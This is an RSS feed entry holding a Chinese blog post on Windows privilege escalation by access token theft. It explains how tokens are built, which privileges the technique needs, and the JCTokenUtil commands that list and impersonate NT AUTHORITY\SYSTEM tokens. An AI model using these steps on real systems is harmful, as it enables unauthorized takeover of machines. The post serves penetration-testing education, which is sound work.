      <link>https://luoshine99-gif.github.io/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows%E6%8F%90%E6%9D%83/windows%E6%8F%90%E6%9D%83-%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%E6%93%8D%E7%BA%B5/</link>
      <pubDate>Thu, 11 Dec 2025 00:00:00 +0800</pubDate>
      <guid>https://luoshine99-gif.github.io/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows%E6%8F%90%E6%9D%83/windows%E6%8F%90%E6%9D%83-%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%E6%93%8D%E7%BA%B5/</guid>
      <description>&lt;h1 id=&#34;windows提权-访问令牌操纵&#34;&gt;windows提权-访问令牌操纵&lt;/h1&gt;&#xA;&lt;h3 id=&#34;windows访问令牌&#34;&gt;Windows访问令牌&lt;/h3&gt;&#xA;&lt;p&gt;令牌（Token）是系统的临时密钥，相当于账户名和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的，它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌持续存在系统中，除非系统重新启动&lt;/p&gt;&#xA;&lt;p&gt;令牌最大的特点就是随机性，不可预测，一般黑客或软件无法猜测出来，令牌有很多种：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;访问令牌（Access Token）表示访问控制操作主题的系统对象&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;会话令牌（Session Token）：是交互会话中唯一的身份标识符，可以理解为web中的token&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;密保令牌（Security Token）又叫作认证令牌或者硬件令牌，是一种计算机身份效验的物理设备&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Windows 的访问令牌（AccessToken） 中包含如下内容&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;用户账户的安全标识符(SID)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;用户所属的组的SID&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;用于标识当前登陆会话的登陆SID&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;用户或用户组所拥有的权限列表&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;所有者SID&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;主要组的SID&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;访问控制列表&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;访问令牌的来源&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;令牌是主要令牌还是模拟令牌&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;限制SID的可选列表&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;目前的模拟等级&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;其他统计的数据&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Windows 的访问令牌（AccessToken） 有两种类型&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Delegation Token：授权令牌，也叫主令牌，支持交互式会话登录 (例如本地用户直接登录、远程桌面登录访问)&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Impresonation Token：模拟令牌，支持非交互的会话 (例如使用 net use访问共享文件夹)。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;两种 token 只在系统重启后清除，具有 Delegation token 的用户在注销后，该 Token 将变成Impersonation token（模拟令牌），依旧有效&lt;/p&gt;&#xA;&lt;p&gt;值得一提的是，令牌窃取只能在特权用户上下文中才能完成，因为通过令牌创建进程使用的&lt;code&gt;CreateProcessWithTokenW&lt;/code&gt;和&lt;code&gt;CreateProcessAsUserA&lt;/code&gt;两个windows API分别要求用户必须拥有&lt;code&gt;SeImpersonatePrivilege&lt;/code&gt;和&lt;code&gt;SeAssignPrimaryTokenPrivilege/SeIncreaseQuotaPrivilege&lt;/code&gt;特权，而拥有这两个特权的用户一般为系统管理员账户、网络服务账户、系统服务账户（IIS、MSSQL等）&lt;/p&gt;&#xA;&lt;h3 id=&#34;令牌窃取&#34;&gt;令牌窃取&lt;/h3&gt;&#xA;&lt;p&gt;该操作往往用来将管理员权限提升至SYSTEM、TrustedInstaller等更高权限，若本地管理员因为某些组策略设置无法获取某些特权，可以通过令牌窃取来假冒&lt;code&gt;NT AUTHORITY\SYSTEM&lt;/code&gt;的令牌&lt;/p&gt;&#xA;&lt;h4 id=&#34;利用jctokenutil窃取令牌&#34;&gt;利用JCTokenUtil窃取令牌&lt;/h4&gt;&#xA;&lt;p&gt;本来想使用incognito.exe的，但是发现了一款incognito.exe二开工具&lt;a href=&#34;https://github.com/chroblert/JCTokenUtil/&#34;&gt;JCTokenUtil&lt;/a&gt;，感觉更好用&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;首先上传工具至目标主机，执行命令获取&lt;code&gt;NT AUTHORITY\SYSTEM&lt;/code&gt;账户的令牌：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;TokenUtil_x64.exe ListTokens -u &lt;span class=&#34;s2&#34;&gt;&amp;#34;NT AUTHORITY\SYSTEM&amp;#34;&lt;/span&gt; &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241010205644421-2139962666.png&#34; alt=&#34;image-20241010205643236&#34;&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;再试试用获取到的&lt;code&gt;NT AUTHORITY\SYSTEM&lt;/code&gt;账户令牌执行命令：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;TokenUtil_x64.exe Execute -p 304 -e whoami -c &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241010205755669-1838553159.png&#34; alt=&#34;image-20241010205755170&#34;&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 id=&#34;利用metasploit窃取令牌&#34;&gt;利用metasploit窃取令牌&lt;/h4&gt;&#xA;&lt;p&gt;msf同样内置了incognito框架，可以直接使用&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
